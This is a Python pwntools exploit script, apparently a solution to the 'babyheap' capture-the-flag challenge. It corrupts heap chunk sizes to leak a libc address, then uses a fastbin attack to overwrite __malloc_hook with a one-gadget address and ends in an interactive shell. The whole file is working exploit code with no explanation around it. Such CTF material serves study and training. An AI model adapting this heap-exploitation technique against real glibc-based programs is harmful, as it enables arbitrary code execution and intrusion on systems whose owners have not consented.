from pwn import *

os.environ['LD_PRELOAD'] = './libc.so.6'
r = process('./babyheap')
e = ELF('./babyheap')
libc = ELF('./libc.so.6')
context.arch = 'amd64'
#context.log_level = 'debug'

def alloc(size):
    r.sendlineafter('Command: ', '1')
    r.sendlineafter('Size: ', str(size))
#    print r.recvuntil('\n')

def fill(index, content):
    r.sendlineafter('Command: ', '2')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Size: ', str(len(content)))
    r.sendlineafter('Content: ', content)

def free(index):
    r.sendlineafter('Command: ', '3')
    r.sendlineafter('Index: ', str(index))

def dump(index):
    r.sendlineafter('Command: ', '4')
    r.sendlineafter('Index: ', str(index))

# leak libc
alloc(0x20)# start writing
alloc(0x20)# off by one
alloc(0x20)# padding
alloc(0x20)# start writing
alloc(0x80)# target
alloc(0x80)# padding
free(2)
free(1)
fill(0, '\x00'*0x28+p64(0x31)+'\xc0')
fill(3, '\x00'*0x28+p64(0x31))
alloc(0x20)
alloc(0x20)
fill(3, '\x00'*0x28+p64(0x91))
free(4)
dump(2)
r.recvuntil('Content: \n')

libc_base = u64(r.recv(8)) - libc.symbols['__malloc_hook'] - 0x68
__malloc_hook = libc_base+libc.symbols['__malloc_hook']
magic = libc_base + 0x4526a
target = __malloc_hook-0x20-3
log.info('libc base is: %#x', libc_base)
log.info('malloc_hook is: %#x', __malloc_hook)

# attack
alloc(0x60)
alloc(0x60)# -> 6
alloc(0x60)# -> 7
alloc(0x60)
free(7)
fill(6, '\x00'*0x68+p64(0x71)+p64(target))
alloc(0x60)
alloc(0x60)
fill(9, 'A'*(0x20-0x5-0x8)+p64(magic))
alloc(100)
r.interactive()
